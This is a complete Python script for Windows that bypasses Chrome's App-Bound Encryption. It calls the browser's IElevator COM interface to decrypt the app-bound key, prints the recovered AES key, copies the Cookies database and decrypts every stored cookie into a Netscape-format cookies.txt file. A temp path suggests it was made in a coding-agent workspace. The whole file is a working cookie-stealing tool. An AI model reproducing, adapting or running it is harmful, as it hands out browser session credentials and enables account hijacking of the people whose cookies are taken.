import os, sys, base64, json, sqlite3, ctypes
from ctypes import wintypes, POINTER, c_void_p, c_ulong, c_ubyte, byref, windll

# ---------- GUID ----------
class GUID(ctypes.Structure):
    _fields_ = [("Data1", ctypes.c_ulong), ("Data2", ctypes.c_ushort),
                ("Data3", ctypes.c_ushort), ("Data4", ctypes.c_ubyte * 8)]
    def __init__(self, s):
        parts = s.replace('{','').replace('}','').split('-')
        self.Data1 = int(parts[0], 16)
        self.Data2 = int(parts[1], 16)
        self.Data3 = int(parts[2], 16)
        for i, b in enumerate(bytes.fromhex(parts[3]) + bytes.fromhex(parts[4])):
            self.Data4[i] = b

CLSID = GUID('{708860E0-F641-4611-8895-7D867DD3675B}')
IIDS = [GUID('{463ABECF-410D-407F-8AF5-0DF35A005CC8}'),  # IElevatorChrome v1
        GUID('{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}')]  # base IElevator

ole32 = windll.ole32
oleaut32 = windll.oleaut32

ole32.CoInitializeEx(None, 2)  # COINIT_APARTMENTTHREADED

# ---------- CoCreateInstance ----------
pv = c_void_p()
ok = False
for IID in IIDS:
    hr = ole32.CoCreateInstance(byref(CLSID), None, 0x4, byref(IID), byref(pv))
    print(f"[*] try IID {IID.Data1:X} -> hr=0x{hr & 0xFFFFFFFF:X}")
    if hr == 0:
        ok = True
        break
if not ok:
    print("CoCreateInstance failed for all IIDs")
    sys.exit(1)
print("[+] IElevator instance created")

# CoSetProxyBlanket (EOAC_DYNAMIC_CLOAKING etc.)
RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6
RPC_C_IMP_LEVEL_IMPERSONATE = 3
EOAC_DYNAMIC_CLOAKING = 0x40
hr = ole32.CoSetProxyBlanket(pv, 10, 10, None, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                             RPC_C_IMP_LEVEL_IMPERSONATE, None, EOAC_DYNAMIC_CLOAKING)
if hr != 0:
    print(f"[!] CoSetProxyBlanket warning: 0x{hr:X}")

# ---------- DecryptData vtable[5] ----------
vt = ctypes.cast(pv, POINTER(POINTER(c_void_p)))
DecryptData = vt.contents[5]
Proto = ctypes.WINFUNCTYPE(ctypes.c_long, c_void_p, c_void_p, POINTER(c_void_p), POINTER(c_ulong))
fn = Proto(DecryptData)

def decrypt_key(blob):
    bstr_in = oleaut32.SysAllocStringByteLen(blob, len(blob))
    plain = c_void_p()
    last_err = c_ulong()
    hr = fn(pv, bstr_in, byref(plain), byref(last_err))
    oleaut32.SysFreeString(bstr_in)
    if hr != 0:
        print(f"[-] DecryptData failed hr=0x{hr:X} last_err={last_err.value}")
        return None
    n = oleaut32.SysStringByteLen(plain)
    buf = (c_ubyte * n).from_address(plain)
    data = bytes(buf)
    oleaut32.SysFreeString(plain)
    return data

# ---------- Read Local State ----------
local_state_path = os.path.expandvars(
    r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
with open(local_state_path, 'r', encoding='utf-8') as f:
    ls = json.load(f)
abk = ls['os_crypt']['app_bound_encrypted_key']
raw = base64.b64decode(abk)
assert raw[:4] == b'APPB', raw[:4]
blob = raw[4:]
print(f"[*] app_bound_encrypted_key blob len={len(blob)}")
aes_key = decrypt_key(blob)
if not aes_key or len(aes_key) != 32:
    print(f"[-] bad key (len={None if aes_key is None else len(aes_key)})")
    sys.exit(1)
print(f"[+] recovered AES key ({len(aes_key)} bytes): {aes_key.hex()}")

# ---------- Decrypt cookies ----------
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
def decrypt_v20(blob):
    assert blob[:3] == b'v20', blob[:3]
    nonce = blob[3:15]
    inner = blob[15:]
    ciphertext = inner[:-16]
    tag = inner[-16:]
    aes = AESGCM(aes_key)
    plain = aes.decrypt(nonce, ciphertext + tag, None)
    return plain[32:].decode('utf-8', 'replace')

src = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies')
dst = r'C:\Users\lvhaosir\AppData\Local\Temp\opencode\chrome_cookies.db'
try:
    import shutil
    shutil.copyfile(src, dst)
except Exception as e:
    print(f"[!] copy failed ({e}), using existing copy")

con = sqlite3.connect(dst)
cur = con.cursor()
cur.execute("SELECT host_key,name,encrypted_value,path,expires_utc,is_secure FROM cookies")
rows = cur.fetchall()
con.close()

import datetime
def netscape_date(e):
    # chrome expires_utc is microseconds since 1601; -1 = session
    if e == 0 or e == -1:
        return 0
    ts = (e / 1e6 - 11644473600)
    return int(ts)

out = []
for host, name, ev, path, exp, secure in rows:
    if not ev:
        val = ''
    else:
        try:
            val = decrypt_v20(bytes(ev))
        except Exception as ex:
            val = ''
    if val == '':
        continue
    sec = 'TRUE' if secure else 'FALSE'
    out.append(f"{host}\tTRUE\t{path}\t{sec}\t{netscape_date(exp)}\t{name}\t{val}")

cookie_txt = "NA\tTRUE\t/\tFALSE\t0\tdummy\tdummy\n" + "\n".join(out) + "\n"
with open('output/cookies.txt', 'w', encoding='utf-8') as f:
    f.write(cookie_txt)
print(f"[+] wrote output/cookies.txt with {len(out)} cookies")
